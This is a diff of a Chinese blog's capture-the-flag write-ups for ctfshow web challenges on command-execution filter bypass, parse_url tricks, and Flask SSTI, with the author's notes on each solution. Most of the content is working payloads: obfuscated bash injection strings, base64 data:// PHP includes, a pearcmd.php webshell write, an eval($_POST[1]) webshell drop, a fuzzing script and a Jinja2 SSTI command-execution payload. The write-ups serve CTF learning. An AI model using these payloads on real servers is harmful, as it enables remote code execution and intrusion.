&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//+ ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~</span></span><br></pre></td></tr></table></figure>
+
+<p>题目给了提示：<strong>本套题目运行环境均为CENTOS7</strong></p>
+<p>但是这是根据wp的，我本地centos7无法执行&#x2F;getflag</p>
+<p>解法一</p>
+<p>&#x2F;getflag</p>
+<p>给出payload: ctf_show&#x3D;&#x2F;?????a?</p>
+<p>解法二： &#x2F;bin&#x2F;base64 &#x2F;flag</p>
+<p> payload: ctf_show&#x3D;&#x2F;???&#x2F;?a??64 &#x2F;??a?</p>
+<p>解法三</p>
+<p>ctf_show&#x3D;&#x2F;bin&#x2F;bash &#x2F;flag</p>
+<p>payload： ctf_show&#x3D;&#x2F;???&#x2F;?a?? &#x2F;??a?</p>
+<h2 id="极限命令执行2"><a href="#极限命令执行2" class="headerlink" title="极限命令执行2"></a>极限命令执行2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp fuzz一下</p>
+<p>![](C:\various files\blog\myblog\source_posts\极限命令执行\QQ截图20230411135838.png)</p>
+<p>![](C:\various files\blog\myblog\source_posts\极限命令执行\QQ截图20230411135932.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>
+
+<p>python fuzz脚本</p>
+<p>payload： &#x2F;getflag</p>
+<p>但是我在centos7上试了试并没有成功</p>
+<p>同样，其他实验结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\154\163&#x27; #ls 成功</span><br><span class="line">$&#x27;\57\146\154\141\147&#x27;        # /flag   成功</span><br><span class="line">$&#x27;\57\147\145\164\146\154\141\147&#x27; # /getflag 失败</span><br><span class="line">$&#x27;\164\141\143\40\57\146\154\141\147&#x27; #/tac /flag 失败</span><br><span class="line">报错内容bash: tac /flag: 没有那个文件或目录</span><br></pre></td></tr></table></figure>
+
+<p>能解出题目的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$&#x27;\57\147\145\164\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="极限命令执行3"><a href="#极限命令执行3" class="headerlink" title="极限命令执行3"></a>极限命令执行3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!#$&amp;&#x27;()01&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>
+
+<p>在linux 中，</p>
+<p>单引号’’，双引号””的区别是</p>
+<p>单引号’’剥夺了所有字符的特殊含义，单引号’’内就变成了单纯的字符，。</p>
+<p>双引号””则对于双引号””内的参数替换($)和命令替换(&#96;&#96;)是个例外。</p>
+<p>比如说 n&#x3D;3</p>
+<p>echo ‘$n’</p>
+<p>结果就是$n</p>
+<p>改成双引号 echo “$n”，结果就是3</p>
+<p>[(9条消息) linux中单引号‘ ,双引号“, 反引号 <code> </code>, $, $(), ${}与变量_linux单引号中引用变量_TGAO的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=%E5%8D%95%E5%BC%95%E5%8F%B7">https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=单引号</a> ：不进行转译和获取 变量 ，输出原字符串 echo ‘date’ date 双引号,Dec 29 10%3A33%3A40 CST 2020 echo date date)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(( ))属于执行计算公式，等价于$[ ]，$( )和` `属于命令替换，$&#123; &#125;属于变量替换</span><br></pre></td></tr></table></figure>
+
+<p>bash里二进制可表示为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $((2#100))</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
+
+<p> 但是由于把2过滤了，所以使用位运算符号构造出2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $((1&lt;&lt;1))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;三个小于号(here-strings)，语法：command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]；$word会展开并作为command的stdin</span><br></pre></td></tr></table></figure>
+
+<p>解析一次后cat &#x2F;flag 为字符串</p>
+<p>空格并没有被解析</p>
+<p>使用两次here-strings，使其成为标准输入去执行这个复杂命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="极限命令执行4"><a href="#极限命令执行4" class="headerlink" title="极限命令执行4"></a>极限命令执行4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>fuzz 一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">str= &quot;&quot;</span><br><span class="line">for i in range(255):</span><br><span class="line">    data = &#123;&#x27;ctf_show&#x27;:chr(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    if &quot;??????&quot; in retext:</span><br><span class="line">        print(1)</span><br><span class="line">    else:</span><br><span class="line">        str += chr(i)</span><br><span class="line"> </span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!#$&amp;&#x27;()0&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>
+
+<p>1没了构造1,$: 第一个#是计算字符长度，第二个#是字符串的名字。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;##&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="极限命令执行5"><a href="#极限命令执行5" class="headerlink" title="极限命令执行5"></a>极限命令执行5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>fuzz一下，还剩 <code>! $ &amp; &#39; ()&lt;+\-&#123;&#125;~</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $(())</span><br><span class="line">结果为0</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$(())\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/p/17128363.html">ctfshow-极限命令执行复现 - GTL_JU - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123;</span><br><span class="line">  [&quot;scheme&quot;]=&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(8) &quot;hostname&quot;</span><br><span class="line">  [&quot;port&quot;]=&gt;</span><br><span class="line">  int(9090)</span><br><span class="line">  [&quot;user&quot;]=&gt;</span><br><span class="line">  string(8) &quot;username&quot;</span><br><span class="line">  [&quot;pass&quot;]=&gt;</span><br><span class="line">  string(8) &quot;password&quot;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(5) &quot;/path&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(9) &quot;arg=value&quot;</span><br><span class="line">  [&quot;fragment&quot;]=&gt;</span><br><span class="line">  string(6) &quot;anchor&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http://system(&quot;cd%20..;cd%20..;cd%20..;tac%20fl*&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>官方payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=aa://eval(base64_decode(&#x27;c3lzdGVtKCJjYXQgL2ZsYWdfaXNfaGVyZS50eHQiKTs=&#x27;));/aaa</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http://data:://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgL18qIik/Pg==</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=data::;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<p>解法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=..://aaa/../../../../../../usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http://cd%20..;cd%20..;cd%20..;tac%201*</span><br></pre></td></tr></table></figure>
+
+<p>解法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=ctfshow://`echo &#x27;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==&#x27;|base64 -d`/h1xa</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure>
+
+<p>变量覆盖</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=user://pass:query@scheme/?fragment%23data://,&lt;?php system(&#x27;cat /_f1ag_1s_h3ree&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=ctfshow://&lt;script language=&#x27;php&#x27;&gt;eval($_POST[1]);/var/www/html/1.php</span><br></pre></td></tr></table></figure>
+
+<p>写入shell</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/22/ctfshow/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -219,7 +488,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-04 23:39:17" itemprop="dateModified" datetime="2023-06-04T23:39:17+08:00">2023-06-04</time>
+                <time title="修改时间：2023-07-03 22:10:03" itemprop="dateModified" datetime="2023-07-03T22:10:03+08:00">2023-07-03</time>
               </span>
 
           <br>
@@ -228,7 +497,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.8k</span>
+              <span>2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -249,6 +518,14 @@
       
             <span id="more"></span>
 
+<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">     echo &quot;hack!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=&gt;nl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=*&gt;z</span><br></pre></td></tr></table></figure>
+
+<p> <code>*</code>代表 当前目录下文件，即nl xxx.php, </p>
+<p>然后访问z 即可</p>
 <h1 id="年ctf"><a href="#年ctf" class="headerlink" title="年ctf"></a>年ctf</h1><h2 id="除夕"><a href="#除夕" class="headerlink" title="除夕"></a>除夕</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line"></span><br><span class="line">if($year==2022 &amp;&amp; $year+1!==2023)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>payload:</p>
@@ -368,7 +645,20 @@
 <p>学习两个新的命令</p>
 <p>sed</p>
 <p>awk</p>
+<h1 id="内部赛"><a href="#内部赛" class="headerlink" title="内部赛"></a>内部赛</h1><h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><p>查看源码，可以看到key param</p>
+<p>flask session 伪造,登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
+<h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S=a;system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S=a=system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
